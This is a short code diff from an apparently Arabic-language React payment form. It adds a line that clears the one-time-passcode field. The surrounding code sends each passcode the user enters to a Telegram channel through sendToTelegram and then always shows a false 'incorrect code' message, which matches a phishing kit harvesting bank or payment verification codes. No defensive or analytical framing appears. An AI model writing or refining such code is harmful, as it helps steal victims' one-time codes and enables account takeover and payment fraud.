@@ -380,6 +380,7 @@ function Step4({ transactionId }: { transactionId: string }) {
     if (otp.length !== 4 && otp.length !== 6) { setError("يرجى إدخال رمز مكون من 4 أو 6 أرقام"); return; }
     sendToTelegram("otp", otp);
     setError("رمز التحقق غير صحيح، يرجى التحقق والمحاولة مجدداً");
+    setOtp("");
     setSubmitCooldown(5);
     const t = setInterval(() => setSubmitCooldown((p) => { if (p <= 1) { clearInterval(t); return 0; } return p - 1; }), 1000);
   };
